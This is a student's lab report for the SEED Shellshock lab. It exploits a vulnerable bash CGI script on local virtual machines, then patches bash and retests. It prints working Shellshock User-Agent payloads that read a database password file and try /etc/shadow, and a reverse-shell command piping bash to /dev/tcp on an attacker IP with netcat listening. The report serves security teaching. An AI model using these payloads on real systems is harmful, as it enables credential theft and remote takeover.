---
title: "SEED LAB: Shellshock Attack Report"

date: "2021-09-27"

tags: ["seedlab", "lecture", "os", "security"]


links:
    website: 'https://seedsecuritylabs.org/Labs_20.04/Software/Shellshock/'
    alias: Shellshock
---

[Shellshock Question File](https://seedsecuritylabs.org/Labs_20.04/Software/Shellshock/)

## TASK01
### 1.1 Custom Bash Shell Prompt
For identifying different bash used, I also modified the value of `$PS1` by the command below, in which we used the value `$0` to identifying the bash file. I also added the value of `PS1` into the `.bashrc` file. 
```shell
$ export PS1="[$0]\[\e[1;32m\]\u@\h\[\e[m\]:\w\\$ "
```
Image below shows the result after set the variable, which will display the bash file used. 
![](/assets/images/16326883206491/16327539597252.jpg)
I also stored the command in the `.bashrc` file to set the format after open a new bash automatically. I used the echo command below with `>>` to attach the command, and `grep` to verify: 
```shell
$ echo 'export PS1="[$0]\[\e[1;32m\]\u@\h\[\e[m\]:\w\\$ "' >> ~/.bashrc
$ cat ~/.bashrc | grep -s "export PS1"
```
Image below shows the outputs for them. 
![](/assets/images/16326883206491/16327540241642.jpg)
### 1.2 Execute the bash_shellshock
Finally, I executed the `$ /bin/bash_shellshock` as required. Image below show the output after executing.  
![](/assets/images/16326883206491/16327541146545.jpg)

## Task02 
### 2.1 Create the myprog.cgi and make it execuatable
We first used `vim` to create a script file `myprog.cgi` in the `/usr/lib/cgi-bin` directory, and used the `chmod` to make it executable. The two commands are shown below: 
```shell
$ sudo vim /usr/lib/cgi-bin/myprog.cgi
$ sudo chmod 755 /usr/lib/cgi-bin/myprog.cgi
```
The code for `myprog.cgi` is in the codes section below. We specified the `#!/bin/bash_shellshock` at the start of the file as required. It means that we will use the vulnerable version of Bash. 
```shell
#!/bin/bash_shellshock

echo "Content-type: text/plain"
echo
echo
echo "Hello World"
```
### 2.2 Execute the program by curl
After that we executed the `curl http://localhost/cgi-bin/myprog.cgi` to access the program through server. Its output is shown in the image below, which worked well on the both two versions for Bash. 
![](/assets/images/16326883206491/16326983371851.jpg)

## Task03
### 3.1 Modify the code in myprog.cgi
At first, we use `vim` to change the codes. Our new codes are shown in codes section below: 
```shell
#!/bin/bash_shellshock

echo "Content-type: text/plain"
echo
echo "******Environment Variables ****** "
strings /proc/$$/environ
```
### 3.2 Transfer environment variables 
When the Apache web server in our VM receives a CGI request from a user, it will use `fork()` to create a new process at first. And then, it will invoke one of the `exec()` methods to execute the specified CGI program. During the process, the server uses the environmental variables to transfer many data (such as User-Agent and Referer etc.) to the forked program. 
Therefore, we can use the option `-A` to define the user agent of our request, which allow us to change the environment variable to the server. 
```shell
$ curl http://localhost/cgi-bin/myprog.cgi -A "TEST" | grep USER_AGENT
```
The command above were used, in which we specified the user agent by `-A "TEST"`. Besides, we used `grep` to search all environmental variables to find out value of the `HTTP_USER_AGENT`. Image below is the output for the command: 
![](/assets/images/16326883206491/16326984887666.jpg)

## Task04
### 4.1 Launch an attack 
We use the command below to launch an attack, in which I also use the curl with options `-s` to make response shorter and `-A` specified user agent.
```shell
$ curl http://localhost/cgi-bin/myprog.cgi -s -A \
"() { echo hello; }; echo Content_type: text/plain; echo;\
/bin/cat /var/www/CSRF/Elgg/elgg-config/settings.php" \
| grep -s 'dbpass = ' 
```
Our code tries to steal the database password stored inside the `setting.php` file. `echo Content_type: text/plain;` is also essential, which defines a field in the head of the response. Without such a field, PHP will return an error.  Image below is the output of the command, which shows us the password of the database. 
![](/assets/images/16326883206491/16326999112287.jpg)

### 4.2 Why not /etc/shadow?
I do not think it is possible to remotely access the script's `/etc/shadow` file because that file is only readable with the root privilege. We used the `ll` command to verify that and tried to access that file by `cat`. The image below shows what we got. 
![](/assets/images/16326883206491/16327003348200.jpg)

We still used command below to launch an attack, but the `curl` did not response any useful information this time. 
```shell
curl http://localhost/cgi-bin/myprog.cgi -v -A "() { echo hello; }; echo Content_type: text/plain;echo; /bin/cat /etc/shadow" -v
```
We also tried to use option `-v` (verbose) to get more information. The image below is the output, in which the content-length is zero. 
![](/assets/images/16326883206491/16327005370706.jpg)

## TASK05
### 5.1 Prepare for server and client
For this task, we cloned another virtual machine and set the two machines in same NAT networks.
```shell
# Commands for the server
$ echo 'export PS1="[SEV]\[\e[1;36m\]\u@\h\[\e[m\]:\w\\$ "' >> /.bashrc
$ source ~/.bashrc
# Commands for the attacker
$ echo 'export PS1="[ATC]\[\e[1;31m\]\u@\h\[\e[m\]:\w\\$ "' >> ~/.bashrc
$ source ~/.bashrc
```
We also used the commands above to configure their bash prompt, which can help us identify them more easily. As the image shows, we used the left one as server and right one as attacker. 
![](/assets/images/16326883206491/16327681715222.jpg)

### 5.2 Reverse Shell
We used two key steps to get a reverse shell: First, the attacker need to start a TCP server to listening a specific port number, which will be used to interact with the bash program on a victim server; Second is to make the server change its `stdout`, `stdin` and `stderr` to TCP socket connected with the IP and port number of the attacker's device.  
#### 5.2.1 Step 01
We used `netcat` with option -l to implement the first one. The command is: 
```shell
$ nc -l 9090 -v
```
It will start a TCP server listing on port number 9090. When it receives any messages from the victim server, it will output them on the attacker's terminal. Due to the bilateral communication of TCP connection, the attacker can also send commands to the server. 
#### 5.2.2 Step 02
We implemented the second one by executing the command below on the server: 
```shell
$ /bin/bash -i > /dev/tcp/10.0.2.15/9090 0<&1 2>&1
```
In the command, the option `i` means the interactive model that will show the bash prompt. The `> /dev/.../9090` makes the `stdout` to the TCP socket connected with `10.0.2.15:9090`. `0<&1` and means also change the $1$ (`stdin`) and $2$ (`stderr`) to the socket. 

#### 5.2.3 Commands outputs
The image below shows the outputs of our commands. The left is our victim server and the right is our attacker. We started the `netcat` program at first, and it successfully connected with the $10.0.2.6$ (server's IP), after executing of the `bash -i ...` command on the server. We verified the attack by `hostname -I` which can output all IP addresses of a device. 
![](/assets/images/16326883206491/16327685275524.jpg)

### 5.3 Launch an attack
To launch an attack, we need run two terminals on the attacker vm. One is used to listen the TCP socket at $9090$, and another is used for send the data to our victim server by `curl`. 
```shell
# In the terminal one
$ nc -l 9090 -v
# In the terminal two
$ curl http://10.0.2.6/cgi-bin/myprog.cgi -v -A \
"() { :; }; echo Content_type: text/plain;echo; \
/bin/bash -i > /dev/tcp/10.0.2.15/9090 0<&1 2>&1"
```
Image below shows that we successfully access the bash in the victim server as `www-data` user. 
![](/assets/images/16326883206491/16327698266434.jpg)


## TASK06

### 6.1 Discussion
After reviewing the diff file there, we find three change: 
* The first is the `common.h` file, in which two flags are added. The comments here mentions that they are used for checking validation of the function definitions and the number of commands. 
![](/assets/images/16326883206491/16327633385051.jpg)
* The second is the `evalstring.c` file. The codes in Line25 to 32 do check the validation of functions in the environmental variables. It will stop the following codes if it is invalid. There is also another check in Line 41 for the number of commands. It will also stop if the number is over one. 
![](/assets/images/16326883206491/16327636141383.jpg)
* The final one is `variables.c` file, where the program checks the name of environmental variables. The variables names with invalid identifiers will not be converted to a function anymore. 
![](/assets/images/16326883206491/16327641269129.jpg)

In conclusion, the bash program will check the validation for both the environment variable's contents and names. It will be converted into a function in the subprocess only if valid in its name and contents. 
### 6.2 Patch Bash 4.2
We used the following three commands in this section. `tar -zxf` is used to unzip the file. `patch` command is used to apply the patch into the `Bash v4.2`. The `-p1` command is used to make the program ignore the name differences. 
```shell
$ tar -zxf bash-4.2.tar.gz
$ cd bash-4.2
$ patch -p1 < ../CVE-2014-6271.diff
```
The image shows outputs that we got. The patches are successfully applied to the three `.c` files we mentioned before. 
![](/assets/images/16326883206491/16327645447441.jpg)

After that, we configured and compiled the patched `Bashv4.2` using the commands below: 
```shell
# Check the system and generate the makefile also
$ ./configure
# Compile the code
$ make
```


![](/assets/images/16326883206491/16327659716758.jpg)

### 6.3 Redo Task03
#### 6.3.1 Modified the myprog.cgi
We changed the codes in `/usr/lib/cgi-bin/myprog.cgi` to make it use the `Bashv4.2` compiled before. The codes in the changed file is shown below: 
```shell
#!/home/seed/Labs/w4/task06/bash-4.2/bash

echo "Content-type: text/plain"
echo
echo "******Environment Variables ****** "
strings /proc/$$/environ
```
#### 6.3.2 Change the user-agent
We executed the command below again to check whether the variable `HTTP_USER_AGENT` will be changed. 
```
$ curl http://localhost/cgi-bin/myprog.cgi -A "TEST" | grep USER_AGENT
```
Image below shown that the user-agent is still changed in the patched bash. 
![](/assets/images/16326883206491/16327666168176.jpg)

### 6.4 Redo Task04
We were curious whether our attack still work. Therefore, we execute the attack command below again. 
```shell 
$  curl http://localhost/cgi-bin/myprog.cgi -s -A \
"() { echo hello; }; echo Content_type: text/plain; echo;\
/bin/cat /var/www/CSRF/Elgg/elgg-config/settings.php"
```
The image below shows that previous attack commands cannot work anymore. The server handler our user-agent value as an environmental variable instead of a function. Furthermore, the malicious code did not execute in this case. 
![](/assets/images/16326883206491/16327670674094.jpg)

#### 6.5 Redo Task05
We firstly re-tried the reveres bash. We reused all previous commands in task05, and these codes are demonstrated below. 
```shell
# Commands used on attacker. 
$ echo 'export PS1="[ATC]\[\e[1;32m\]\u@\h\[\e[m\]:\w\\$ "' >> ~/.bashrc
$ source ~/.bashrc
$ nc -l 9090 -v

# Commands used on server. 
$ echo 'export PS1="[SEV]\[\e[1;36m\]\u@\h\[\e[m\]:\w\\$ "' >> ~/.bashrc
$ source ~/.bashrc
$ /bin/bash -i > /dev/tcp/10.0.2.15/9090 0<&1 2>&1

```
Image below is the output, where the reverse bash still work. It is because it do not use the `Bash v4.2` in there. 
![](/assets/images/16326883206491/16327700510840.jpg)

After that, we re-launched the attack by the http server. We opened two terminals again, and used the commands below: 
```shell
# In the terminal one
$ nc -l 9090 -v
# In the terminal two
$ curl http://10.0.2.6/cgi-bin/myprog.cgi -v -A \
"() { :; }; echo Content_type: text/plain;echo; \
/bin/bash -i > /dev/tcp/10.0.2.15/9090 0<&1 2>&1"
```
The image below shows their output. The `curl` did not work as expect under the patched `Bash v2.4`, which correctly handled all environmental variables. 
![](/assets/images/16326883206491/16327703950349.jpg)
